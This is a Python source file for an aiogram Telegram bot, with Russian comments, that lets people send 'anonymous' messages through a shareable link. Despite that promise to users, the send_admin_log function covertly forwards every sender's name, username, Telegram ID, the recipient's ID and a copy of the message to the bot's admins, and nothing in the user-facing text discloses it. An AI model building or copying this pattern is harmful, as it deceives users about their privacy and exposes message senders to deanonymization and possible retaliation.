import asyncio
import aiosqlite
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from config import BOT_TOKEN, ADMINS

bot = Bot(token=BOT_TOKEN, parse_mode="HTML")
dp = Dispatcher()

DB = "db.sqlite3"
user_targets = {}


# ───────── БАЗА ─────────
async def init_db():
    async with aiosqlite.connect(DB) as db:
        await db.execute("""
        CREATE TABLE IF NOT EXISTS questions(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sender_id INTEGER,
        receiver_id INTEGER
        )
        """)
        await db.commit()


# ───────── КНОПКИ ─────────
def cancel_btn():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel")]
        ]
    )


def again_btn():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✍️ Написать ещё", callback_data="again")]
        ]
    )


def share_btn(link):
    share = f"https://t.me/share/url?url=По этой ссылке можно прислать мне анонимное сообщение:%0A👉 {link}"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📤 Поделиться ссылкой", url=share)]
        ]
    )


# ───────── ЛОГ АДМИНАМ ─────────
async def send_admin_log(message, target_id):

    sender = message.from_user
    text = message.text or message.caption or "медиа"

    log = (
        f"📨 Новое сообщение\n\n"
        f"👤 Отправитель: {sender.first_name} (@{sender.username or 'нет'})\n"
        f"ID: {sender.id}\n\n"
        f"🎯 Получатель ID: {target_id}\n\n"
        f"💬 {text}"
    )

    for admin in ADMINS:
        try:
            await bot.send_message(admin, log)
            await message.copy_to(admin)
        except:
            pass


# ───────── START ─────────
@dp.message(CommandStart())
async def start(message: types.Message, command: CommandStart):

    user_id = message.from_user.id
    bot_username = (await bot.get_me()).username
    link = f"https://t.me/{bot_username}?start={user_id}"

    if command.args:
        target = int(command.args)

        if target == user_id:
            return

        user_targets[user_id] = target

        await message.answer(
            "🚀 Здесь можно отправить анонимное сообщение\n\n"
            "Отправить можно текст и медиа",
            reply_markup=cancel_btn()
        )
        return

    await message.answer(
        f"Начните получать анонимные вопросы прямо сейчас!\n\n👉 {link}",
        reply_markup=share_btn(link)
    )


# ───────── ОТПРАВКА СООБЩЕНИЯ ─────────
@dp.message()
async def send_question(message: types.Message):

    sender_id = message.from_user.id

    if sender_id not in user_targets:
        return

    target = user_targets[sender_id]

    try:
        await message.copy_to(target)
    except:
        await message.answer(
            "❌ Сообщение не доставлено.\n\n"
            "Пользователь не активировал бота."
        )
        return

    # А получает уведомление БЕЗ КНОПОК
    await bot.send_message(
        target,
        "💬 У тебя новое сообщение!"
    )

    async with aiosqlite.connect(DB) as db:
        await db.execute(
            "INSERT INTO questions(sender_id,receiver_id) VALUES(?,?)",
            (sender_id, target)
        )
        await db.commit()

    await send_admin_log(message, target)

    await message.answer(
        "✅ Сообщение отправлено!",
        reply_markup=again_btn()
    )


# ───────── КНОПКИ ─────────
@dp.callback_query(lambda c: c.data == "again")
async def again(call: types.CallbackQuery):
    await call.message.answer("✍️ Напишите сообщение")


@dp.callback_query(lambda c: c.data == "cancel")
async def cancel(call: types.CallbackQuery):

    bot_username = (await bot.get_me()).username
    link = f"https://t.me/{bot_username}?start={call.from_user.id}"

    await call.message.answer(
        f"Начните получать анонимные вопросы прямо сейчас!\n\n👉 {link}",
        reply_markup=share_btn(link)
    )


# ───────── ЗАПУСК ─────────
async def main():
    await init_db()
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
